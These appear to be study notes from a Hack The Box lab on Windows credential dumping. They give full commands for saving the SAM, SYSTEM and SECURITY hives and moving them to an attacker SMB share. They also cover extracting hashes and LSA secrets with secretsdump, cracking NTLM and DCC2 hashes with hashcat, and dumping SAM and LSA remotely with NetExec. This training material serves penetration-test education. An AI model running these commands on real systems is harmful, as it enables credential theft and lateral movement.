# Attacking SAM, SYSTEM & SECURITY – Detailed Notes (HTB)

> **Source:** Based on the uploaded HTB notes.

---

# Overview

![Image](https://images.openai.com/static-rsc-4/Aj5DJodGYPuaBwDJTwMEvABJ6V7k5ozhKhDj9qV2Kvzz3X2vi_IGEUnUgpiI-TJcfm0Zph3AygQW5B4UdIV1mCzFSOkaOxxYRVAW7fI2-lHOWR3pf8ZP1aORcqr2KIeoPV7QJLDz5UNigmm6UseehQTKLalyNuYsmEKvIb-jGkDsEpMyI55ZI0DFU9EUIzc-?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/noCVgkXtwQy4GyMeEbY-I7A2hluTVSyat9r6fNhEWBWDBHxTKyywPYDiQXfa60YCdwXwAsvAG6v8y4DT6XaKWr491Vz4eABCreBgVIuGxa0DBeTYFQ2-KfJkTmTRNFIxh6cEVhQZOuaDsQTHhmiD2BJwlvT2Y4x8hzgWKYXRsi3d-w9yMF-UdYDrl-69NA4O?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/00wPaa_tgkNzMfU6ocI3cNIV23SxJ8afG_1efjBeoBYDQoT6220Yci3qv5Yatg7Fc2BS4kfgF-MHns_kQVvQ68Nu00pHpKCmc7BiOulhrE0nDdeCBNGhh3cvLn5V_Y4H0dSNOf_LekAA09pu394kofyK1koTmVKXZnhNoZoTwSf_hWlSgnPGmsxyu3bzuMWu?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/mcEinTHrIEdNCte967V6xNvHbTJ3kqJHio1BCjcsUcnJg7h0kcZ9RvUBL28SLgQDtgJiAazOi29IxZdvzIs1h3wAo96QGKHuKXv7X9FfSmdHBsmT1Gr4GjTIu4MyP6FPrIV6TgYwDU5aALNuuAPCukTnay5-sHsWzXCbSy9DZ-m4B_6d1waLnYJAZBloRQHT?purpose=fullsize)

Once we obtain **Administrator** or **SYSTEM** privileges on a Windows machine, one of the first post-exploitation objectives is to extract credentials.

Instead of keeping an active shell on the victim, we can:

- Copy the registry hives
    
- Transfer them to our attack machine
    
- Dump password hashes offline
    
- Crack them offline
    
- Reuse recovered credentials
    

Offline attacks are stealthier and reduce the need to remain connected to the compromised host.

---

# Windows Registry Hives

Windows stores sensitive credential information inside several Registry Hives.

There are **three important registry hives**:

|Registry Hive|Purpose|
|---|---|
|**HKLM\SAM**|Stores local user password hashes|
|**HKLM\SYSTEM**|Stores BootKey used to decrypt SAM|
|**HKLM\SECURITY**|Stores LSA Secrets, DCC2 hashes, DPAPI keys, cached credentials|

---

## Why are all three needed?

```
SAM
 │
 ▼
Contains encrypted NTLM hashes

SYSTEM
 │
 ▼
Contains BootKey

BootKey
 │
 ▼
Decrypts SAM hashes

SECURITY
 │
 ▼
Contains cached credentials
DPAPI keys
LSA Secrets
```

Without the **SYSTEM BootKey**, the hashes inside SAM cannot be decrypted.

---

# HKLM\SAM

## Purpose

Contains:

- Local Users
    
- LM Hashes
    
- NT Hashes
    

Examples:

```
Administrator
Guest
DefaultAccount
Bob
Rocky
```

Passwords are **never stored in plaintext**.

Instead Windows stores password hashes.

---

# HKLM\SYSTEM

Contains:

```
BootKey
```

The BootKey encrypts:

- SAM hashes
    

Without SYSTEM:

❌ Cannot decrypt SAM

---

# HKLM\SECURITY

Contains much more than passwords.

Examples:

- Cached Domain Credentials (DCC2)
    
- DPAPI Machine Keys
    
- DPAPI User Keys
    
- LSA Secrets
    
- Cached logons
    

This hive is extremely valuable on **Domain Joined** machines.

---

# Registry Hive Relationship

```
             HKLM\SYSTEM
                   │
             BootKey
                   │
                   ▼
             HKLM\SAM
                   │
             NTLM Hashes
                   │
                   ▼
             Offline Cracking

             HKLM\SECURITY
                   │
        Cached Credentials
        DPAPI Keys
        LSA Secrets
```

---

# Saving Registry Hives

Administrator privileges are required.

Commands:

```cmd
reg.exe save hklm\sam C:\sam.save
```

```
The operation completed successfully.
```

---

Save SYSTEM

```cmd
reg.exe save hklm\system C:\system.save
```

---

Save SECURITY

```cmd
reg.exe save hklm\security C:\security.save
```

---

These create offline copies:

```
sam.save

system.save

security.save
```

---

# Important Note

If only interested in:

**Local password hashes**

Need:

```
SAM

+

SYSTEM
```

If interested in:

- Cached domain credentials
    
- DPAPI
    
- LSA Secrets
    

Need:

```
SECURITY
```

also.

---

# Moving Registry Hives

After dumping the registry hives, we move them to our attack machine.

HTB demonstrates using **Impacket SMB Server**.

---

## Start SMB Share

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
-smb2support CompData \
/home/ltnbob/Documents/
```

### Why use `-smb2support`?

Modern Windows disables:

```
SMBv1
```

because of serious security vulnerabilities.

SMB2 ensures compatibility.

---

## Copy Files

```cmd
move sam.save \\10.10.15.16\CompData
```

---

```cmd
move security.save \\10.10.15.16\CompData
```

---

```cmd
move system.save \\10.10.15.16\CompData
```

---

Verify:

```bash
ls
```

Output:

```
sam.save

security.save

system.save
```

---

# Dumping Hashes using SecretsDump

One of the most useful Impacket tools:

```
secretsdump.py
```

Check installation:

```bash
locate secretsdump
```

---

Run:

```bash
python3 secretsdump.py \
-sam sam.save \
-security security.save \
-system system.save \
LOCAL
```

---

## First Step

SecretsDump retrieves:

```
BootKey
```

Example:

```
Target system bootKey:

0x4d8c7cff...
```

This key decrypts:

```
SAM hashes
```

---

## Output

```
Administrator

Guest

DefaultAccount

bob

sam

rocky

ITlocal
```

Each line:

```
username
RID
LM Hash
NT Hash
```

Format:

```
username:RID:LMHASH:NTHASH
```

Example:

```
bob:1001:
aad3...
64f12cdd...
```

---

# LSA Secrets

SecretsDump also extracts:

```
DPAPI Machine Key

DPAPI User Key

NL$KM

Cached Credentials
```

These originate from:

```
HKLM\SECURITY
```

---

# Understanding Output

```
Administrator:500
```

RID

```
500
```

means

Administrator account.

---

```
501
```

Guest.

---

```
1001
```

Normal user.

---

# NTLM vs LM Hashes

|LM|NTLM|
|---|---|
|Old Windows|Modern Windows|
|Weak|Strong|
|Easy to crack|Harder|
|Windows XP|Windows 10/11|

Modern systems generally only use **NTLM**.

---

# Cracking NTLM Hashes

Copy NT hashes:

```
64f12...

31d6...

6f8c...

184e...

f7eb...
```

Save:

```
hashestocrack.txt
```

---

Run Hashcat:

```bash
hashcat \
-m 1000 \
hashestocrack.txt \
/usr/share/wordlists/rockyou.txt
```

---

## Mode

```
-m 1000
```

means

```
NTLM
```

---

Example:

```
dragon

adrian

iloveme
```

Recovered passwords can be used (with authorization) to assess password reuse across systems.

---

# Hashcat Modes

|Mode|Hash Type|
|---|---|
|1000|NTLM|
|2100|DCC2|

---

# DCC2 Hashes

## What are DCC2 Hashes?

Domain Cached Credentials v2

Stored inside:

```
HKLM\SECURITY
```

Example:

```
$DCC2$10240#administrator#23d975...
```

---

## Why DCC2 is Harder

Unlike NTLM:

```
NTLM
```

↓

Fast

---

```
DCC2
```

↓

Uses

```
PBKDF2
```

which intentionally slows password cracking.

The HTB example highlights that DCC2 cracking can be **hundreds of times slower** than NTLM on the same hardware.

---

## Crack DCC2

```bash
hashcat \
-m 2100 \
'$DCC2$10240#administrator#23d975...' \
rockyou.txt
```

Mode:

```
2100
```

---

# DPAPI

![Image](https://images.openai.com/static-rsc-4/U8wKeaLoqxdeDpZttLseyat2vND8SMeJKSTczBgof1xHCDd9aMq2tQGdJso7KDvQS2DPmG12WW5khVYzXGTqf9Agu98UmZqCQTO9wAh2iu8YTwcmuGdnMB29KU1rEKkjm-LZECLpzJcjk534Uv6tWN2-JJQqdRGih6Brx7-L2cBLhZ7d7pZw5uB4cI-5xVuc?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/P6CVd0JTtv5kTxYXK_Df0VBo8WqsKqVgmGPQjgRpJoe0qLCymzRLmi_Vz-O-p83EH2UWiv4LTm8C2sJd0mCbKJtkWKxrPvAlbeX5KPSODNzxby3L7akp6QONxhnY6X67qteROKt8kVnlraWUrtk3JYjMM0lQCyzeFnEHTJtKOjmaWXj16cyu3N6UQ69MR4El?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/jLo3qL04t130bvrbfEeuMQm2Grz3GYee2JNTDe70fim34gDRsMGOXz9lRLjc157tjxWqXBIJkfbGWq0DwOd1wtCj2nvNxlOsHepQHuggkitTPSryI28EZOYBQWK2EfcZZ6DkYBP3p5RG_VK87q-9R35Hzh1e_Gvlm5f1hN8a0kwaOUq8dyBo9wdFTh9G4znn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/PEis6FW7OzN2PNYM16XWBdQaFY16KoKU95bFklv2e1YvwzmBnmFVJGTpKGkhcnCqOICifjGJULVCF6s5AoOTSeRVgynFtfLLmDefDDHNU9CtGPOuikELzQWhubDNedSyfxGagaSEvkJbw5nMkQew1Wryi83DlUNYh6kFgRLIP_q8jm_6yGU7WcsTB5VsXXcv?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/gnaLEShjEfcaVdEDf2m2JPww19n1do7wcB8HRHVmX_fN_DBhofRBMG6CTibhKXUqNjfVqks2Y8AVEzrzE1sPFniBgNcLUbnyHYCTJy3_PxXkUG0wQlDVSI5uhH3-pnnd5ttvVxH6NMDlpzohhbHRicx7bgazvYfQhNRR42Eiag_Up4GUfFWkNux8x68A2zt4?purpose=fullsize)

DPAPI stands for

```
Data Protection API
```

Windows uses DPAPI to encrypt:

- Chrome passwords
    
- Outlook passwords
    
- Credential Manager
    
- VPN passwords
    
- WiFi passwords
    
- RDP credentials
    

---

## Applications Using DPAPI

|Application|Stores|
|---|---|
|Chrome|Saved passwords|
|Internet Explorer|Saved passwords|
|Outlook|Email passwords|
|Credential Manager|Network credentials|
|Remote Desktop|Saved RDP credentials|

---

## DPAPI Tools

Common tools used during authorized assessments include:

- Impacket **dpapi**
    
- **Mimikatz**
    
- **DonPAPI**
    

Example shown in HTB:

```
dpapi::chrome
```

decrypts Chrome credentials.

---

# Remote LSA Secret Dump

If valid **local administrator credentials** are available, NetExec can retrieve LSA secrets remotely.

Example:

```bash
netexec smb TARGET \
--local-auth \
-u bob \
-p PASSWORD \
--lsa
```

May retrieve:

```
LSA Secrets

DPAPI Keys

NL$KM

Cached Credentials
```

---

# Remote SAM Dump

Similarly, NetExec can dump the SAM database remotely when authorized and properly authenticated.

Example:

```bash
netexec smb TARGET \
--local-auth \
-u bob \
-p PASSWORD \
--sam
```

This returns the local account NTLM hashes from the target system.

---

# Complete Attack Workflow

```
Gain Administrator Access
            │
            ▼
Dump Registry Hives
(SAM, SYSTEM, SECURITY)
            │
            ▼
Transfer Files
            │
            ▼
SecretsDump
            │
            ├───────────────┐
            │               │
            ▼               ▼
      NTLM Hashes     LSA Secrets
            │               │
            ▼               ▼
        Hashcat       DPAPI Keys
            │
            ▼
Recover Passwords
```

---

# Important Commands (Keep These)

### Save Registry Hives

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

---

### Start SMB Share

```bash
python3 smbserver.py -smb2support CompData /home/user/Documents/
```

---

### Move Registry Hives

```cmd
move sam.save \\IP\CompData
move system.save \\IP\CompData
move security.save \\IP\CompData
```

---

### Dump Hashes

```bash
python3 secretsdump.py \
-sam sam.save \
-security security.save \
-system system.save \
LOCAL
```

---

### Crack NTLM

```bash
hashcat -m 1000 hashes.txt rockyou.txt
```

---

### Crack DCC2

```bash
hashcat -m 2100 dcc2.txt rockyou.txt
```

---

### Remote LSA Secrets

```bash
netexec smb TARGET --local-auth -u USER -p PASS --lsa
```

---

### Remote SAM Dump

```bash
netexec smb TARGET --local-auth -u USER -p PASS --sam
```

---

# HTB / Exam Tips ⭐

- **HKLM\SAM** stores local account password hashes.
    
- **HKLM\SYSTEM** stores the **BootKey**, which is required to decrypt the SAM database.
    
- **HKLM\SECURITY** stores **LSA Secrets**, **DPAPI keys**, and **cached domain credentials (DCC2)**.
    
- **SecretsDump** first retrieves the **BootKey**, then decrypts and extracts the hashes and secrets.
    
- **Hashcat mode 1000** is used for **NTLM** hashes.
    
- **Hashcat mode 2100** is used for **DCC2 (Domain Cached Credentials v2)** hashes.
    
- **DPAPI** protects credentials for Windows features and applications such as **Credential Manager**, **Chrome**, **Outlook**, VPNs, and RDP.
    
- **NetExec** can remotely retrieve **LSA secrets** (`--lsa`) and **SAM hashes** (`--sam`) when you have appropriate administrative credentials and authorization.
    
- These techniques should **only** be performed in environments where you have explicit permission, such as **Hack The Box labs** or approved penetration tests.